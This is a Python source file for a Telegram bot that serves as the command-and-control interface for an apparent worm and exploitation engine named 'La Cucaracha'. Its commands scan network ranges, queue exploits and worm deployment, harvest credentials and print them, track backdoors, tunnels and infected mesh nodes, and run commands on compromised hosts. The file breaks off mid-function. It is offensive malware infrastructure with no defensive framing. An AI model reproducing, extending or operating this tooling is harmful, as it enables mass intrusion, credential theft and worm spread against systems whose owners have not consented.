#!/usr/bin/env python3
"""
🐛 LA CUCARACHA — Telegram Command Bot
Companion bot for LaCucaracha v5 killchain engine.
Handles all fleet/target/offensive/node/agmin commands.
by 🇭🇷PhonkAlphabet

Runs alongside LaCucaracha.py. Commands are processed against shared
worm_mesh_v5.db. Action commands are queued via bot_commands table
for the main engine to pick up between epochs.
"""

import os, sys, json, time, subprocess, threading, logging, html, re
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any
from collections import deque
import sqlite3
import queue

# --- Telegram imports ---
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ python-telegram-bot not installed")

# --- Config ---
DB_V5 = "/opt/hermes/worm_mesh_v5.db"
DB_LEGACY = "/opt/hermes/worm_mesh.db"
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "telegram_config.json")
CONTROL_FILE = "/opt/hermes/bot_control.json"
BOT_COMMANDS_DB = "/opt/hermes/bot_commands.db"

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("LaCucarachaBot")

# Ensure bot_commands DB exists
def init_bot_db():
    conn = sqlite3.connect(BOT_COMMANDS_DB)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS bot_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT NOT NULL,
            params TEXT DEFAULT '',
            status TEXT DEFAULT 'pending',
            result TEXT DEFAULT '',
            created_at REAL NOT NULL,
            processed_at REAL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS bot_config (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_bot_db()

# Load config
def load_config() -> dict:
    cfg = {"bot_token": "", "chat_ids": [0], "admin_ids": [0]}
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                cfg.update(json.load(f))
        except: pass
    return cfg

# Connect to v5 DB
class V5DB:
    def __init__(self, path=DB_V5):
        self.path = path
        self._conn = None
        if os.path.exists(path):
            self._conn = sqlite3.connect(path, check_same_thread=False)
            self._conn.row_factory = sqlite3.Row

    def q(self, sql: str, params: tuple = ()) -> List[sqlite3.Row]:
        if not self._conn:
            return []
        try:
            c = self._conn.execute(sql, params)
            return c.fetchall()
        except Exception as e:
            log.error(f"DB query error: {e}")
            return []

    def execute(self, sql: str, params: tuple = ()) -> bool:
        if not self._conn:
            return False
        try:
            self._conn.execute(sql, params)
            self._conn.commit()
            return True
        except Exception as e:
            log.error(f"DB execute error: {e}")
            return False

    def close(self):
        if self._conn:
            self._conn.close()

db = V5DB()

# --- Command Handlers ---

def get_cfg(key: str, default: Any = "") -> Any:
    conn = sqlite3.connect(BOT_COMMANDS_DB)
    try:
        c = conn.execute("SELECT value FROM bot_config WHERE key=?", (key,))
        row = c.fetchone()
        return row[0] if row else default
    except: return default
    finally: conn.close()

def set_cfg(key: str, value: str):
    conn = sqlite3.connect(BOT_COMMANDS_DB)
    try:
        conn.execute("INSERT OR REPLACE INTO bot_config (key, value) VALUES (?, ?)", (key, value))
        conn.commit()
    except: pass
    finally: conn.close()

def queue_command(cmd: str, params: str = "") -> int:
    conn = sqlite3.connect(BOT_COMMANDS_DB)
    try:
        conn.execute("INSERT INTO bot_commands (command, params, status, created_at) VALUES (?, ?, 'pending', ?)",
                     (cmd, params, time.time()))
        conn.commit()
        c = conn.execute("SELECT last_insert_rowid()")
        return c.fetchone()[0]
    except Exception as e:
        log.error(f"Queue error: {e}")
        return -1
    finally:
        conn.close()

def escape_md(text: str) -> str:
    """Escape Telegram Markdown special characters."""
    # For MarkdownV2 style
    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
        text = text.replace(ch, '\\' + ch)
    return text

def format_number(n: int) -> str:
    if n >= 1000000:
        return f"{n/1000000:.1f}M"
    if n >= 1000:
        return f"{n/1000:.1f}K"
    return str(n)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (
        f"👋 **Welcome, {user.first_name}!**\n\n"
        f"I'm **🐛 La Cucaracha v5.0** — the 16-phase predator killchain engine.\n\n"
        f"**Fleet Status:**\n"
        f"`              ╔══╗`\n"
        f"`              ║██║`\n"
        f"`    ╔══╗ ╔══╗ ║██║`\n"
        f"`    ║██║ ║██║ ║██║`\n"
        f"`╔══╗║██║ ║██║ ║██║`\n"
        f"`╚══╝╚══╝ ╚══╝ ╚══╝`\n\n"
        f"Use `/help` to see all commands."
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🤖 **LA CUCARACHA — COMMANDS**\n"
        "**📊 Fleet Commands**\n"
        "`/start` — 🚀 Initialize and show welcome\n"
        "`/help` — ❓ This menu\n"
        "`/status` — 📊 Fleet status dashboard\n"
        "`/stats` — 📈 Detailed statistics\n"
        "`/logs N` — 📋 Recent N log lines\n"
        "`/dashboard` — 🎮 Interactive dashboard\n\n"
        "**🎯 Target Management**\n"
        "`/targets N` — 🎯 List N targets\n"
        "`/claim IP` — 🏴 Claim a target\n"
        "`/top` — 🏆 Top targets by score\n"
        "`/whois IP` — 🔎 OS/cred hints\n"
        "`/ping IP` — 📶 Ping target\n\n"
        "**⚡ Offensive Operations**\n"
        "`/scan CIDR` — 🔍 Start scan\n"
        "`/exploit N` — ⚡ Exploit N targets\n"
        "`/deploy` — 📦 Deploy to exploited\n"
        "`/mesh` — 🕸️ Mesh network status\n\n"
        "**🖥️ Node Control**\n"
        "`/nodes` — 🖥️ List worm nodes\n"
        "`/reset IP` — 🔄 Reset target\n"
        "`/delete IP` — 🗑️ Delete target\n\n"
        "**🔥 Aggressive**\n"
        "`/aggressive` — 🔥 Toggle aggressive mode\n"
        "`/predator` — 🐉 Predator hunting mode\n"
        "`/harvest` — 🌾 Harvest credentials\n"
        "`/autostart` - start auto ultimate\n"
        "`/autostop` - stop auto ultimate\n"
        "`/exfil IP` — 📤 Exfiltrate data\n\n"
        "**👑 Admin Only**\n"
        "`/broadcast MSG` — 📢 Send to ALL nodes\n"
        "`/exec IP CMD` — 💻 Execute on node\n"
        "`/shutdown` — 🛑 Shutdown engine\n"
        "`/killswitch` — 💀 Activate killswitch\n"
        "`/telegram` — 🤖 Bot settings"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📊 Fleet status dashboard — conditional if/then logic per section."""
    def eq(q):
        try:
            c = sqlite3.connect(DB_V5)
            c.row_factory = sqlite3.Row
            r = c.execute(q).fetchone()
            c.close()
            return r["c"] if r else 0
        except:
            return 0

    # Load all raw counts
    total_targets = eq("SELECT COUNT(*) as c FROM targets")
    alive_count = eq("SELECT COUNT(*) as c FROM targets WHERE icmp_alive=1")
    tcp_open = eq("SELECT COUNT(*) as c FROM targets WHERE tcp_open=1")
    web_pwned = eq("SELECT COUNT(*) as c FROM targets WHERE web_pwned=1")
    embed_pwned = eq("SELECT COUNT(*) as c FROM targets WHERE embed_pwned=1")
    enterprise_pwned = eq("SELECT COUNT(*) as c FROM targets WHERE enterprise_pwned=1")
    brute_pwned = eq("SELECT COUNT(*) as c FROM targets WHERE brute_pwned=1")
    pwned_count = web_pwned + embed_pwned + enterprise_pwned + brute_pwned
    cve_count = eq("SELECT COUNT(*) as c FROM targets WHERE cve_scanned=1")
    backdoor_count = eq("SELECT COUNT(*) as c FROM targets WHERE backdoor_installed=1")
    tunnel_count = eq("SELECT COUNT(*) as c FROM targets WHERE tunnel_active=1")
    worm_count = eq("SELECT COUNT(*) as c FROM targets WHERE worm_deployed=1")
    crossfeed_count = eq("SELECT COUNT(*) as c FROM targets WHERE crossfeed_count>0")
    mesh_count = eq("SELECT COUNT(*) as c FROM nodes")
    cred_count = eq("SELECT COUNT(*) as c FROM credentials")
    intel_count = eq("SELECT COUNT(*) as c FROM intel_log")

    lines = ['**📊 LA CUCARACHA — CONDITIONAL FLEET STATUS**', '']

    # IF/THEN: TARGETS
    if total_targets > 0:
        target_line = f"🎯 **Targets:** `{total_targets:,}` ("
        if alive_count > 0:
            target_line += f"`{alive_count}` 🟢 alive"
        else:
            target_line += "no ICMP response"
        if tcp_open > 0:
            target_line += f", `{tcp_open}` 🔍 TCP open"
        target_line += ")"
        lines.append(target_line)
    else:
        lines.append("🎯 **Targets:** `0` (no scan data yet)")

    # IF/THEN: PWNED with per-phase breakdown
    if pwned_count > 0:
        parts = []
        if web_pwned > 0:
            parts.append(f"🌐{web_pwned}")
        if embed_pwned > 0:
            parts.append(f"⚙️{embed_pwned}")
        if enterprise_pwned > 0:
            parts.append(f"🏢{enterprise_pwned}")
        if brute_pwned > 0:
            parts.append(f"🔑{brute_pwned}")
        lines.append(f"🔓 **Pwned:** `{pwned_count}` ({' / '.join(parts)})")
    else:
        lines.append("🔓 **Pwned:** `0` — no successful exploits yet")

    # IF/THEN: POST-EXPLOIT (only show if something exists)
    post_items = []
    if worm_count > 0:
        post_items.append(f"🐛{worm_count} worm")
    if backdoor_count > 0:
        post_items.append(f"🚪{backdoor_count} backdoor")
    if tunnel_count > 0:
        post_items.append(f"🔌{tunnel_count} tunnel")
    if crossfeed_count > 0:
        post_items.append(f"🔄{crossfeed_count} crossfeed")
    if post_items:
        lines.append("📦 **Post-Exploit:** " + " / ".join(post_items))

    # IF/THEN: CREDENTIALS with service breakdown
    if cred_count > 0:
        try:
            c = sqlite3.connect(DB_V5)
            c.row_factory = sqlite3.Row
            svc_rows = c.execute(
                "SELECT LOWER(service) as svc, COUNT(*) as cnt "
                "FROM credentials GROUP BY LOWER(service) ORDER BY cnt DESC LIMIT 5"
            ).fetchall()
            c.close()
            svc_parts = [f"{r['svc'][:6]}:{r['cnt']}" for r in svc_rows]
            lines.append(f"🔑 **Creds:** `{cred_count:,}` ({' / '.join(svc_parts)})")
        except Exception:
            lines.append(f"🔑 **Creds:** `{cred_count:,}`")
    else:
        lines.append("🔑 **Creds:** `0` (none harvested)")

    # IF/THEN: SECONDARY ASSETS
    if intel_count > 0:
        lines.append(f"🧠 **Intel Logs:** `{intel_count}`")
    if mesh_count > 0:
        lines.append(f"🕸️ **Mesh Active:** `{mesh_count}` nodes")
    if cve_count > 0:
        lines.append(f"🧨 **CVE Vulns:** `{cve_count}` targets vulnerable")

    lines.append('')

    # IF/THEN: ENGINE STATUS
    engine_running = False
    try:
        proc = subprocess.run(
            ["pgrep", "-f", "LaCucaracha.py.*auto"],
            capture_output=True, text=True, timeout=5
        )
        if proc.stdout.strip():
            pids = proc.stdout.strip().splitlines()
            lines.append("✅ **Engine:** Running (PID " + ", ".join(pids[:3]) + ")")
            engine_running = True
        else:
            lines.append("❌ **Engine:** Not running")
    except:
        lines.append("❌ **Engine:** Cannot check")

    # IF/THEN: MODE STATUS
    agg = get_cfg("aggressive", "0")
    pred = get_cfg("predator", "0")
    mode_parts = []
    if agg == "1":
        mode_parts.append("🔥 Aggressive")
    if pred == "1":
        mode_parts.append("🐉 Predator")
    if mode_parts:
        lines.append("🛡️ **Mode:** " + " ".join(mode_parts))
    else:
        lines.append("🛡️ **Mode:** Standard — passive")

    # IF/THEN: EXPLOIT STATUS SUMMARY
    if pwned_count > 0 and engine_running:
        lines.append(f"⚡ **Status:** Active — `{pwned_count}` total compromised")

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📈 Detailed conditional statistics — only shows active phases."""
    def eq(q):
        try:
            c = sqlite3.connect(DB_V5)
            c.row_factory = sqlite3.Row
            r = c.execute(q).fetchone()
            c.close()
            return r["c"] if r else 0
        except:
            return 0

    # Load ALL phase counts in one pass (fewer DB round-trips)
    counts = {
        "icmp": eq("SELECT COUNT(*) as c FROM targets WHERE icmp_alive=1"),
        "tcp": eq("SELECT COUNT(*) as c FROM targets WHERE tcp_open=1"),
        "cve": eq("SELECT COUNT(*) as c FROM targets WHERE cve_scanned=1"),
        "web": eq("SELECT COUNT(*) as c FROM targets WHERE web_pwned=1"),
        "embed": eq("SELECT COUNT(*) as c FROM targets WHERE embed_pwned=1"),
        "enterprise": eq("SELECT COUNT(*) as c FROM targets WHERE enterprise_pwned=1"),
        "brute": eq("SELECT COUNT(*) as c FROM targets WHERE brute_pwned=1"),
        "backdoor": eq("SELECT COUNT(*) as c FROM targets WHERE backdoor_installed=1"),
        "tunnel": eq("SELECT COUNT(*) as c FROM targets WHERE tunnel_active=1"),
        "worm": eq("SELECT COUNT(*) as c FROM targets WHERE worm_deployed=1"),
        "crossfeed": eq("SELECT COUNT(*) as c FROM targets WHERE crossfeed_count>0"),
        "intel": eq("SELECT COUNT(*) as c FROM intel_log"),
        "creds": eq("SELECT COUNT(*) as c FROM credentials"),
        "targets": eq("SELECT COUNT(*) as c FROM targets"),
    }

    lines = ["**📈 LA CUCARACHA — CONDITIONAL STATS**\n"]

    # IF/THEN: RECONNAISSANCE PHASES (skip if all zero)
    recon_items = []
    if counts["icmp"] > 0:
        recon_items.append(f"📡 ICMP: `{counts['icmp']}`")
    if counts["tcp"] > 0:
        recon_items.append(f"🔍 TCP: `{counts['tcp']}`")
    if counts["cve"] > 0:
        recon_items.append(f"🧨 CVE: `{counts['cve']}`")
    if recon_items:
        lines.append("**🔎 Reconnaissance:**")
        lines.extend(recon_items)

    # IF/THEN: EXPLOIT PHASES (only non-zero)
    exploit_items = []
    if counts["web"] > 0:
        exploit_items.append(f"🌐 Web: `{counts['web']}`")
    if counts["embed"] > 0:
        exploit_items.append(f"⚙️ Embed: `{counts['embed']}`")
    if counts["enterprise"] > 0:
        exploit_items.append(f"🏢 Enterprise: `{counts['enterprise']}`")
    if counts["brute"] > 0:
        exploit_items.append(f"🔑 Brute: `{counts['brute']}`")
    if exploit_items:
        lines.append("**💥 Exploitation:**")
        lines.extend(exploit_items)
    else:
        lines.append("💥 **Exploitation:** No successful exploits yet")

    # IF/THEN: POST-EXPLOIT (only non-zero)
    post_items = []
    if counts["backdoor"] > 0:
        post_items.append(f"🚪 Backdoor: `{counts['backdoor']}`")
    if counts["tunnel"] > 0:
        post_items.append(f"🔌 Tunnel: `{counts['tunnel']}`")
    if counts["worm"] > 0:
        post_items.append(f"🐛 Worm: `{counts['worm']}`")
    if counts["crossfeed"] > 0:
        post_items.append(f"🔄 Crossfeed: `{counts['crossfeed']}`")
    if post_items:
        lines.append("**📦 Post-Exploitation:**")
        lines.extend(post_items)

    # IF/THEN: INTEL & ASSETS (always show totals)
    lines.append("**🧠 Intel & Assets:**")
    lines.append(f"🧠 Intel Logs: `{counts['intel']}`")
    lines.append(f"🔑 Credentials: `{counts['creds']:,}`")
    lines.append(f"🎯 Total Targets: `{counts['targets']:,}`")

    # IF/THEN: CRED SERVICES BREAKDOWN (only if creds > 5)
    if counts["creds"] > 5:
        try:
            c = sqlite3.connect(DB_V5)
            c.row_factory = sqlite3.Row
            svc_rows = c.execute("SELECT service, COUNT(*) as c FROM credentials GROUP BY service ORDER BY c DESC LIMIT 10").fetchall()
            c.close()
            lines.append("")
            lines.append("**🔑 Credentials by Service (top 10):**")
            for r in svc_rows:
                bar_len = int(r["c"] / max(counts["creds"], 1) * 20)
                bar = "█" * bar_len + "░" * (20 - bar_len)
                lines.append(f"`{r['service'][:8]:8s}` `{r['c']:>5d}` {bar}")
        except:
            pass

    # IF/THEN: ENGINE STATUS
    try:
        proc = subprocess.run(
            ["pgrep", "-f", "LaCucaracha.py.*auto"],
            capture_output=True, text=True, timeout=5
        )
        lines.append("")
        if proc.stdout.strip():
            pids = proc.stdout.strip().splitlines()
            lines.append("✅ **Engine:** Running (PID " + ", ".join(pids[:3]) + ")")
        else:
            lines.append("❌ **Engine:** Not running")
    except:
        lines.append("")
        lines.append("❌ **Engine:** Cannot check")

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📋 Recent N log lines."""
    n = 20
    if context.args and context.args[0].isdigit():
        n = int(context.args[0])
    n = min(n, 200)

    # Get from DB operations_log
    logs = db.q("SELECT * FROM operations_log ORDER BY id DESC LIMIT ?", (n,))
    if not logs:
        # Try legacy DB
        try:
            conn = sqlite3.connect(DB_LEGACY)
            c = conn.execute("SELECT * FROM operations_log ORDER BY id DESC LIMIT ?", (n,))
            logs = c.fetchall()
            conn.close()
        except:
            logs = []

    if not logs:
        await update.message.reply_text("📋 No log entries found.", parse_mode="Markdown")
        return

    lines = []
    for row in logs[:50]:
        ts = row.get("timestamp", "") or row.get("created_at", "") or ""
        msg = row.get("message", "") or ""
        if isinstance(ts, (int, float)):
            ts = datetime.fromtimestamp(ts).strftime("%H:%M:%S") if ts > 1000000000 else str(ts)
        lines.append(f"`{ts}` {msg[:120]}")

    text = "**📋 Recent Logs:**\n\n" + "\n".join(lines[:50])
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🎮 Interactive dashboard with inline buttons."""
    keyboard = [
        [InlineKeyboardButton("📊 Status", callback_data="dash_status"),
         InlineKeyboardButton("🎯 Targets", callback_data="dash_targets")],
        [InlineKeyboardButton("🐛 Nodes", callback_data="dash_nodes"),
         InlineKeyboardButton("🔑 Creds", callback_data="dash_creds")],
        [InlineKeyboardButton("⚡ Quick Scan", callback_data="dash_scan"),
         InlineKeyboardButton("📦 Deploy Worm", callback_data="dash_deploy")],
        [InlineKeyboardButton("🔥 Aggressive", callback_data="dash_aggressive"),
         InlineKeyboardButton("🐉 Predator", callback_data="dash_predator")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "**🎮 LA CUCARACHA — DASHBOARD**\n\nSelect an action:",
        reply_markup=reply_markup, parse_mode="Markdown"
    )


async def cmd_targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🎯 List N targets."""
    n = 10
    if context.args and context.args[0].isdigit():
        n = int(context.args[0])
    n = min(n, 30)

    targets = db.q(
        "SELECT ip, port, fp_os, icmp_alive, web_pwned, worm_deployed "
        "FROM targets ORDER BY id DESC LIMIT ?", (n,)
    )
    if not targets:
        await update.message.reply_text("🎯 No targets found in database.", parse_mode="Markdown")
        return

    lines = []
    for t in targets:
        ip = t["ip"] or "?"
        port = t["port"] or 0
        os_ = t["fp_os"] or "?"
        alive = "🟢" if t["icmp_alive"] else "⚫"
        pwn = "🔓" if t["web_pwned"] else "❓"
        worm = "🐛" if t["worm_deployed"] else ""
        lines.append(f"{alive} {ip}:{port}  {os_}  {pwn}{worm}")

    text = f"**🎯 Targets ({len(targets)}):**\n\n" + "\n".join(lines)
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🏴 Claim a target."""
    if not context.args:
        await update.message.reply_text("Usage: `/claim <IP>`", parse_mode="Markdown")
        return
    ip = context.args[0]
    result = db.execute("UPDATE targets SET web_pwned=1 WHERE ip=?", (ip,))
    if result:
        await update.message.reply_text(f"🏴 Target `{ip}` claimed.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Target `{ip}` not found.", parse_mode="Markdown")


async def cmd_top(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🏆 Top targets by score."""
    targets = db.q(
        "SELECT ip, fp_os, web_pwned, embed_pwned, enterprise_pwned, brute_pwned, "
        "worm_deployed, intel_collected FROM targets "
        "WHERE web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1 OR brute_pwned=1 "
        "ORDER BY (web_pwned + embed_pwned + enterprise_pwned + brute_pwned + worm_deployed + intel_collected) DESC "
        "LIMIT 10"
    )
    if not targets:
        await update.message.reply_text("🏆 No pwned targets yet.", parse_mode="Markdown")
        return

    lines = []
    for i, t in enumerate(targets, 1):
        score = sum([t.get(k, 0) or 0 for k in ["web_pwned", "embed_pwned", "enterprise_pwned", "brute_pwned", "worm_deployed", "intel_collected"]])
        ip = t["ip"] or "?"
        os_ = t["fp_os"] or "?"
        worm = "🐛" if t["worm_deployed"] else ""
        lines.append(f"{i}. `{ip}` ({os_}) **{score}pts** {worm}")

    text = "**🏆 TOP TARGETS BY SCORE**\n\n" + "\n".join(lines)
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🔎 OS/cred hints for a target."""
    if not context.args:
        await update.message.reply_text("Usage: `/whois <IP>`", parse_mode="Markdown")
        return
    ip = context.args[0]

    targets = db.q("SELECT * FROM targets WHERE ip=?", (ip,))
    if not targets:
        await update.message.reply_text(f"❌ No target `{ip}` found.", parse_mode="Markdown")
        return

    t = targets[0]
    creds = db.q("SELECT * FROM credentials WHERE ip=? LIMIT 10", (ip,))
    intel = db.q("SELECT * FROM intel_log WHERE ip=? LIMIT 5", (ip,))

    lines = [f"🔎 **WHOIS** — `{ip}`\n"]
    lines.append(f"🖥️ **OS:** `{t.get('fp_os', '?')}`")
    lines.append(f"📡 **Alive:** {'🟢' if t.get('icmp_alive') else '⚫'}")
    lines.append(f"🔌 **Ports:** {t.get('port', '?')}")
    lines.append(f"🏷️ **Service:** `{t.get('fp_service', '?')}`")
    lines.append(f"🌐 **HTTP:** `{t.get('fp_http_server', '?')}`")

    if creds:
        lines.append(f"\n**🔑 Credentials ({len(creds)}):**")
        for c in creds[:5]:
            lines.append(f"`{c.get('username','?')}:{c.get('password','?')}` ({c.get('service','?')})")

    if intel:
        lines.append(f"\n**🧠 Intel:**")
        for i_entry in intel[:3]:
            data = i_entry.get("intel_data", "")[:80]
            lines.append(f"`{data}`")

    lines.append(f"\n**Pwn Status:**")
    lines.append(f"{'🌐' if t.get('web_pwned') else '⬜'} WEB  {'⚙️' if t.get('embed_pwned') else '⬜'} EMBED  {'🏢' if t.get('enterprise_pwned') else '⬜'} ENTERPRISE")
    lines.append(f"{'🔑' if t.get('brute_pwned') else '⬜'} BRUTE  {'🐛' if t.get('worm_deployed') else '⬜'} WORM")

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📶 Ping target."""
    if not context.args:
        await update.message.reply_text("Usage: `/ping <IP>`", parse_mode="Markdown")
        return
    ip = context.args[0]

    try:
        result = subprocess.run(
            ["/bin/ping", "-c", "3", "-W", "3", ip],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            # Extract stats
            stats = ""
            for line in result.stdout.splitlines():
                if "rtt" in line.lower() or "stats" in line.lower() or "round-trip" in line.lower():
                    stats = line.strip()
                    break
            if not stats:
                stats = "Host responded."
            await update.message.reply_text(
                f"📶 **PING** — `{ip}`\n\n✅ **Alive**\n`{stats}`",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                f"📶 **PING** — `{ip}`\n\n❌ **No response** (timeout or unreachable)",
                parse_mode="Markdown"
            )
    except subprocess.TimeoutExpired:
        await update.message.reply_text(f"📶 **PING** — `{ip}`\n\n⏱️ **Timed out**", parse_mode="Markdown")
    except FileNotFoundError:
        await update.message.reply_text(f"📶 **PING** — `{ip}`\n\n❌ ping binary not available", parse_mode="Markdown")


async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🔍 Queue a CIDR scan."""
    if not context.args:
        await update.message.reply_text("Usage: `/scan <CIDR>`\nExample: `/scan 192.168.1.0/24`", parse_mode="Markdown")
        return
    cidr = context.args[0]

    # Validate CIDR
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$', cidr):
        await update.message.reply_text(f"❌ Invalid CIDR: `{cidr}`", parse_mode="Markdown")
        return

    cmd_id = queue_command("scan", cidr)
    await update.message.reply_text(
        f"🔍 **Scan queued** — `{cidr}`\nJob ID: `{cmd_id}`\n"
        f"The engine will pick this up on the next epoch.",
        parse_mode="Markdown"
    )


async def cmd_exploit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """⚡ Queue exploit on N targets."""
    n = 10
    if context.args and context.args[0].isdigit():
        n = int(context.args[0])
    n = min(n, 50)

    cmd_id = queue_command("exploit", str(n))
    await update.message.reply_text(
        f"⚡ **Exploit queued** — next {n} targets\nJob ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_deploy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📦 Queue worm deploy."""
    cmd_id = queue_command("deploy", "")
    await update.message.reply_text(
        f"📦 **Worm deploy queued**\nJob ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_nodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🖥️ List worm nodes."""
    mesh_nodes = db.q("SELECT * FROM worm_mesh WHERE active=1 ORDER BY last_heartbeat DESC LIMIT 20")
    worm_targets = db.q("SELECT ip, fp_os, intel_collected FROM targets WHERE worm_deployed=1 LIMIT 20")

    lines = ["**🖥️ WORM NODES**\n"]

    if mesh_nodes:
        lines.append(f"**Mesh Nodes ({len(mesh_nodes)}):**")
        for n in mesh_nodes:
            ip = n.get("node_ip", n.get("ip", "?"))
            last = n.get("last_heartbeat", 0)
            if isinstance(last, (int, float)) and last > 1000000000:
                age = datetime.fromtimestamp(last).strftime("%H:%M")
            else:
                age = str(last)[:8]
            ver = n.get("version", "?")
            lines.append(f"• `{ip}` v{ver} ❤️{age}")

    if worm_targets:
        lines.append(f"\n**Worm Deployed ({len(worm_targets)}):**")
        for t in worm_targets:
            ip = t.get("ip", "?")
            os_ = t.get("fp_os", "?")
            intel_c = t.get("intel_collected", 0)
            lines.append(f"• `{ip}` ({os_}) 🧠{intel_c}")

    if not mesh_nodes and not worm_targets:
        lines.append("No worm nodes deployed yet.")

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_mesh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🕸️ Mesh network status."""
    active = db.q("SELECT COUNT(*) as c FROM worm_mesh WHERE active=1")
    total_mesh = db.q("SELECT COUNT(*) as c FROM worm_mesh")
    peers = db.q("SELECT node_ip, peer_ips, last_heartbeat FROM worm_mesh WHERE active=1 ORDER BY last_heartbeat DESC LIMIT 10")

    a_count = active[0]["c"] if active else 0
    t_count = total_mesh[0]["c"] if total_mesh else 0

    lines = [f"**🕸️ MESH NETWORK**\n"]
    lines.append(f"**Active Nodes:** {a_count} / {t_count}\n")

    if peers:
        lines.append("**Peers:**")
        for p in peers:
            ip = p.get("node_ip", "?")
            peer_ips = p.get("peer_ips", "")
            peer_count = len(peer_ips.split(",")) if peer_ips else 0
            last = p.get("last_heartbeat", 0)
            age = datetime.fromtimestamp(last).strftime("%H:%M") if isinstance(last, (int, float)) and last > 1000000000 else str(last)[:8]
            lines.append(f"• `{ip}` — {peer_count} peers ❤️{age}")

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🔄 Reset target."""
    if not context.args:
        await update.message.reply_text("Usage: `/reset <IP>`", parse_mode="Markdown")
        return
    ip = context.args[0]
    result = db.execute(
        "UPDATE targets SET web_pwned=0, embed_pwned=0, enterprise_pwned=0, brute_pwned=0, "
        "backdoor_installed=0, tunnel_active=0, worm_deployed=0 WHERE ip=?",
        (ip,)
    )
    if result:
        await update.message.reply_text(f"🔄 Target `{ip}` has been reset.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Target `{ip}` not found.", parse_mode="Markdown")


async def cmd_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🗑️ Delete target."""
    if not context.args:
        await update.message.reply_text("Usage: `/delete <IP>`", parse_mode="Markdown")
        return
    ip = context.args[0]
    result = db.execute("DELETE FROM targets WHERE ip=?", (ip,))
    if result:
        await update.message.reply_text(f"🗑️ Target `{ip}` deleted.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Target `{ip}` not found.", parse_mode="Markdown")


async def cmd_aggressive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🔥 Toggle aggressive mode."""
    current = get_cfg("aggressive", "0")
    new_val = "0" if current == "1" else "1"
    set_cfg("aggressive", new_val)

    # Also write control file for main process
    try:
        with open("/tmp/lacucaracha_aggressive", "w") as f:
            f.write(new_val)
    except:
        pass

    state = "ON 🔥" if new_val == "1" else "OFF"
    await update.message.reply_text(f"🔥 **Aggressive Mode:** {state}", parse_mode="Markdown")


async def cmd_predator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🐉 Toggle predator hunting mode."""
    current = get_cfg("predator", "0")
    new_val = "0" if current == "1" else "1"
    set_cfg("predator", new_val)

    try:
        with open("/tmp/lacucaracha_predator", "w") as f:
            f.write(new_val)
    except:
        pass

    state = "ON 🐉" if new_val == "1" else "OFF"
    await update.message.reply_text(f"🐉 **Predator Mode:** {state}", parse_mode="Markdown")


async def cmd_harvest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🌾 Queue credential harvest."""
    cmd_id = queue_command("harvest", "")
    await update.message.reply_text(
        f"🌾 **Credential harvest queued**\nJob ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_autostart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """start auto ultimate - enables full autonomous killchain."""
    set_cfg("autostart", "1")
    set_cfg("autostop", "0")
    try:
        with open("/tmp/lacucaracha_autostart", "w") as f:
            f.write("1")
    except:
        pass
    cmd_id = queue_command("autostart", "")
    await update.message.reply_text(
